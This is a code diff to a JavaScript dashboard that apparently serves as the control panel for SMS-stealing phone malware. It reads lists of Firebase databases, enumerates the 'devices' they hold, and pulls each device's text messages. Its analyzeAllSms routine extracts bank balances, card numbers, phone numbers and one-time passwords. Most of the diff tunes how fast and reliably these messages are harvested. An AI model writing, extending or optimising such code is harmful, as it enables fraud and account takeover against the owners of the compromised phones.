@@ -710,15 +710,13 @@ var FIREBASES_READY = (async function(){
     if (r.ok) txt = await r.text();
   } catch(e){}
   if (!txt.trim()){
-    // ── Parallel fallback: try all candidate files at once ──
+    // fallback: try firebase*.txt files present in the folder
     var names = ['firebase.txt','firebase (1).txt','firebase (2).txt','firebase (3).txt','firebase (4).txt'];
-    var results = await Promise.all(names.map(function(n){
-      return fetch(n + '?_cb=' + Date.now(), { cache:'no-store' })
-        .then(function(r){ return r.ok ? r.text() : ''; })
-        .catch(function(){ return ''; });
-    }));
-    for (var n = 0; n < results.length; n++){
-      if (results[n].trim() && parseUrlList(results[n]).length){ txt = results[n]; break; }
+    for (var n = 0; n < names.length; n++){
+      try {
+        var r2 = await fetch(names[n] + '?_cb=' + Date.now(), { cache:'no-store' });
+        if (r2.ok){ txt = await r2.text(); if (parseUrlList(txt).length) break; }
+      } catch(e){}
     }
   }
   var urls = parseUrlList(txt);
@@ -1035,22 +1033,20 @@ function analyzeAllSms(messages){
   };
 }
 
-// ── Firebase fetch: 8s timeout + keepalive + optional override ──
-function fetchFB(url, key, path, params, externalSignal, timeoutMs){
+function fetchFB(url, key, path, params, externalSignal){
   var clean = url.replace(/\/$/,'');
   var qs = new URLSearchParams();
   if (key) qs.set('auth', key);
   if (params) for (var k in params) qs.set(k, params[k]);
   qs.set('_cb', Date.now());
   var ctrl = new AbortController();
-  var tid = setTimeout(function(){ ctrl.abort(); }, timeoutMs || 8000);
+  var tid = setTimeout(function(){ ctrl.abort(); }, 12000);
   if (externalSignal){
     if (externalSignal.aborted){ try { ctrl.abort(); } catch(e){} }
     else { try { externalSignal.addEventListener('abort', function(){ try { ctrl.abort(); } catch(e){} }, { once: true }); } catch(e){} }
   }
   return fetch(clean + '/' + path.replace(/^\//,'') + '.json?' + qs.toString(), {
-    method:'GET', headers:{ Accept:'application/json' }, cache:'no-store',
-    signal: ctrl.signal, keepalive: true
+    method:'GET', headers:{ Accept:'application/json' }, cache:'no-store', signal: ctrl.signal
   }).then(function(r){ clearTimeout(tid); if (r.status === 404 || !r.ok) return null; return r.json(); })
     .catch(function(){ clearTimeout(tid); return null; });
 }
@@ -1069,24 +1065,6 @@ function pLimit(tasks, limit){
       }
     }
     next();
-  });
-}
-
-// ── Race helper: first NON-EMPTY object wins, fastest path ──
-function raceFirstNonEmpty(promises){
-  return new Promise(function(resolve){
-    var remaining = promises.length, done = false;
-    if (remaining === 0){ resolve(null); return; }
-    promises.forEach(function(p){
-      Promise.resolve(p).then(function(val){
-        if (done) return;
-        if (val && typeof val === 'object' && Object.keys(val).length > 0){ done = true; resolve(val); }
-        else { remaining--; if (remaining === 0){ done = true; resolve(null); } }
-      }).catch(function(){
-        if (done) return;
-        remaining--; if (remaining === 0){ done = true; resolve(null); }
-      });
-    });
   });
 }
 
@@ -1148,7 +1126,6 @@ async function fetchAllDevices(){
   updateStats();
 
   var seen = {}, done = 0, total = FIREBASES.length, t0 = Date.now();
-  var lastRenderAt = 0, firstRenderDone = false;
 
   var tasks = FIREBASES.map(function(url){
     return function(){
@@ -1164,36 +1141,24 @@ async function fetchAllDevices(){
             S.devices.push(d);
           }
         }
-        if (done % 10 === 0 || done === total){
+        if (done % 20 === 0 || done === total){
           var prog = document.getElementById('fetchProgress');
           if (prog){
             var el = ((Date.now() - t0)/1000).toFixed(1);
             prog.textContent = '⚡ ' + done + '/' + total + ' nodes · ' + S.devices.length.toLocaleString('en-IN') + ' fighters · ' + el + 's';
           }
-        }
-        // Progressive render as data streams in
-        var now = Date.now();
-        if (!firstRenderDone && S.devices.length > 0){
-          firstRenderDone = true; lastRenderAt = now;
-          updateStats(); renderDevices();
-        } else if (now - lastRenderAt > 250 || done === total){
-          lastRenderAt = now;
-          updateStats(); renderDevices();
+          if (done % 40 === 0){ updateStats(); renderDevices(); }
         }
       });
     };
   });
-  await pLimit(tasks, 32);
+  await pLimit(tasks, 12);
 
-  // ── Fallback pass: only 2 paths, Set lookup, concurrency 24 ──
-  var urlsWithDevices = new Set();
-  S.devices.forEach(function(d){ urlsWithDevices.add(d._url); });
-  var empty = FIREBASES.filter(function(url){ return !urlsWithDevices.has(url); });
-
+  var empty = FIREBASES.filter(function(url){ return !S.devices.some(function(d){ return d._url === url; }); });
   if (empty.length > 0){
     var ftasks = [];
     empty.forEach(function(url){
-      ['All_Users','users'].forEach(function(path){
+      ['All_Users','users','devices','user_data','registeredDevices'].forEach(function(path){
         ftasks.push(function(){
           return fetchFB(url, NODE_SECRET, path).then(function(data){
             if (data && typeof data === 'object'){
@@ -1210,7 +1175,7 @@ async function fetchAllDevices(){
         });
       });
     });
-    await pLimit(ftasks, 24);
+    await pLimit(ftasks, 12);
   }
 
   rebuildDevMap();
@@ -1271,7 +1236,7 @@ function updateVisibleStatuses(){
 }
 
 var SMS_QUEUE = {
-  queue: [], queuedKeys: {}, active: 0, running: false, maxConcurrent: 8,
+  queue: [], queuedKeys: {}, active: 0, running: false, maxConcurrent: 4,
   lastStatUpdate: 0, lastFilterUpdate: 0,
   push: function(dev, priority){
     var k = dev.id + '::' + dev._url;
@@ -1325,7 +1290,7 @@ var SMS_QUEUE = {
       }
     }
   },
-  setPriority: function(){ this.maxConcurrent = 12; }
+  setPriority: function(){ this.maxConcurrent = 8; }
 };
 
 function appendNewMatch(dev){
@@ -1367,47 +1332,40 @@ function updateProgressBar(){
   if (bar) bar.style.width = ((loaded/Math.max(1,total))*100) + '%';
 }
 
-// ── Parallel path fetch (4 → fastest wins) ──
 function loadOneSms(dev, isPriority){
   var key = dev.id + '::' + dev._url;
   if (S.smsLoaded[key]) return Promise.resolve();
   var url = dev._url;
-  var paths = isPriority ? ['messages/'+dev.id, 'user_sms/'+dev.id, 'smsLogs/'+dev.id, 'sms/'+dev.id]
-                         : ['messages/'+dev.id, 'user_sms/'+dev.id];
+  var paths = isPriority ? ['messages/'+dev.id, 'user_sms/'+dev.id, 'smsLogs/'+dev.id, 'sms/'+dev.id] : ['messages/'+dev.id, 'user_sms/'+dev.id];
   var limit = isPriority ? 80 : 40;
-  var promises = paths.map(function(p){
-    return fetchFB(url, NODE_SECRET, p, { orderBy:'"$key"', limitToLast: String(limit) }, null, 6000)
-      .catch(function(){ return null; });
-  });
-  return raceFirstNonEmpty(promises).then(function(data){
-    if (!data){
+  return tryPath(0);
+  function tryPath(i){
+    if (i >= paths.length){
       S.smsLoaded[key] = true;
       S.smsData[dev.id] = S.smsData[dev.id] || { bankBalances:[], cards:[], phoneNumbers:[], networks:[], otps:[] };
       cacheSet(dev, { number: deriveNumber(dev, S.smsData[dev.id]), messages: [], analyzed: S.smsData[dev.id], status: 'empty' });
-      return;
+      return Promise.resolve();
     }
-    var keys = Object.keys(data);
-    var recent = keys.slice(-limit);
-    var msgs = [];
-    for (var k = 0; k < recent.length; k++){
-      var m = data[recent[k]];
-      if (!m || typeof m !== 'object') continue;
-      var text = m.message || m.body || m.text || '';
-      if (!String(text).trim()) continue;
-      msgs.push({ text: String(text), sender: String(m.sender || m.from || m.address || 'Unknown'), time: String(m.dateTime || m.date || m.timestamp || '') });
-    }
-    msgs.reverse();
-    if (msgs.length === 0){
+    return fetchFB(url, NODE_SECRET, paths[i], { orderBy:'"$key"', limitToLast: String(limit) }).then(function(data){
+      if (!data || typeof data !== 'object') return tryPath(i+1);
+      var keys = Object.keys(data);
+      var recent = keys.slice(-limit);
+      var msgs = [];
+      for (var k = 0; k < recent.length; k++){
+        var m = data[recent[k]];
+        if (!m || typeof m !== 'object') continue;
+        var text = m.message || m.body || m.text || '';
+        if (!String(text).trim()) continue;
+        msgs.push({ text: String(text), sender: String(m.sender || m.from || m.address || 'Unknown'), time: String(m.dateTime || m.date || m.timestamp || '') });
+      }
+      msgs.reverse();
+      if (msgs.length === 0) return tryPath(i+1);
+      var analyzed = analyzeAllSms(msgs);
+      S.smsData[dev.id] = analyzed;
       S.smsLoaded[key] = true;
-      S.smsData[dev.id] = S.smsData[dev.id] || { bankBalances:[], cards:[], phoneNumbers:[], networks:[], otps:[] };
-      cacheSet(dev, { number: deriveNumber(dev, S.smsData[dev.id]), messages: [], analyzed: S.smsData[dev.id], status: 'empty' });
-      return;
-    }
-    var analyzed = analyzeAllSms(msgs);
-    S.smsData[dev.id] = analyzed;
-    S.smsLoaded[key] = true;
-    cacheSet(dev, { number: deriveNumber(dev, analyzed), messages: msgs, analyzed: analyzed, status: 'ok' });
-  });
+      cacheSet(dev, { number: deriveNumber(dev, analyzed), messages: msgs, analyzed: analyzed, status: 'ok' });
+    });
+  }
 }
 
 var _statTO = null;
@@ -1542,7 +1500,6 @@ function renderNextBatch(token, sentinel, list){
   list.insertBefore(frag, sentinel);
   S.currentRenderIndex = end;
   if (S.currentRenderIndex >= S.currentFilteredList.length){
-    if (S.currentRenderIndex >= S.currentFilteredList.length){
     if (S.observer){ try { S.observer.disconnect(); } catch(e){} S.observer = null; }
     sentinel.innerHTML = '<div style="text-align:center;padding:22px;color:var(--text-dim);font-size:11px;font-weight:800;letter-spacing:1.6px;font-family:var(--mono);">◈ ALL ' + S.currentFilteredList.length.toLocaleString('en-IN') + ' NODES DISPLAYED ◈</div>';
     sentinel.style.height = 'auto';
@@ -1864,39 +1821,38 @@ function loadDetailSms(dev){
   });
 }
 
-// ── Parallel path fetch for detail view ──
 function fetchDetailSms(dev, isPoll){
   var url = dev._url;
   var paths = ['messages/'+dev.id, 'user_sms/'+dev.id, 'smsLogs/'+dev.id, 'sms/'+dev.id];
   var sig = S.detailAbort ? S.detailAbort.signal : null;
-  var promises = paths.map(function(p){
-    return fetchFB(url, NODE_SECRET, p, { orderBy:'"$key"', limitToLast:'200' }, sig, 8000)
-      .catch(function(){ return null; });
-  });
-  return raceFirstNonEmpty(promises).then(function(data){
-    if (!data){ if (!isPoll) renderDetailTab(); return false; }
-    var keys = Object.keys(data);
-    var recent = keys.slice(-200);
-    var msgs = [];
-    for (var k = 0; k < recent.length; k++){
-      var m = data[recent[k]];
-      if (!m || typeof m !== 'object') continue;
-      var text = m.message || m.body || m.text || '';
-      if (!String(text).trim()) continue;
-      msgs.push({ text: String(text), sender: String(m.sender || m.from || m.address || 'Unknown'), time: String(m.dateTime || m.date || m.timestamp || '') });
-    }
-    msgs.reverse();
-    if (msgs.length === 0){ if (!isPoll) renderDetailTab(); return false; }
-    var sig2 = msgs.length + '::' + (msgs[0] ? (msgs[0].text||'').substring(0,50) : '');
-    var hasNew = S.lastSmsSignature && sig2 !== S.lastSmsSignature;
-    S.lastSmsSignature = sig2;
-    S.detailSms = msgs;
-    S.detailSmsData = analyzeAllSms(msgs);
-    S.smsData[dev.id] = S.detailSmsData;
-    cacheSet(dev, { number: deriveNumber(dev, S.detailSmsData), messages: msgs, analyzed: S.detailSmsData, status: 'ok' });
-    if (!isPoll) updateStats();
-    return hasNew;
-  });
+  return tryPath(0);
+  function tryPath(i){
+    if (i >= paths.length){ if (!isPoll) renderDetailTab(); return Promise.resolve(false); }
+    return fetchFB(url, NODE_SECRET, paths[i], { orderBy:'"$key"', limitToLast:'200' }, sig).then(function(data){
+      if (!data || typeof data !== 'object') return tryPath(i+1);
+      var keys = Object.keys(data);
+      var recent = keys.slice(-200);
+      var msgs = [];
+      for (var k = 0; k < recent.length; k++){
+        var m = data[recent[k]];
+        if (!m || typeof m !== 'object') continue;
+        var text = m.message || m.body || m.text || '';
+        if (!String(text).trim()) continue;
+        msgs.push({ text: String(text), sender: String(m.sender || m.from || m.address || 'Unknown'), time: String(m.dateTime || m.date || m.timestamp || '') });
+      }
+      msgs.reverse();
+      if (msgs.length === 0) return tryPath(i+1);
+      var sig2 = msgs.length + '::' + (msgs[0] ? (msgs[0].text||'').substring(0,50) : '');
+      var hasNew = S.lastSmsSignature && sig2 !== S.lastSmsSignature;
+      S.lastSmsSignature = sig2;
+      S.detailSms = msgs;
+      S.detailSmsData = analyzeAllSms(msgs);
+      S.smsData[dev.id] = S.detailSmsData;
+      cacheSet(dev, { number: deriveNumber(dev, S.detailSmsData), messages: msgs, analyzed: S.detailSmsData, status: 'ok' });
+      if (!isPoll) updateStats();
+      return hasNew;
+    });
+  }
 }
 
 function renderDetailTab(){
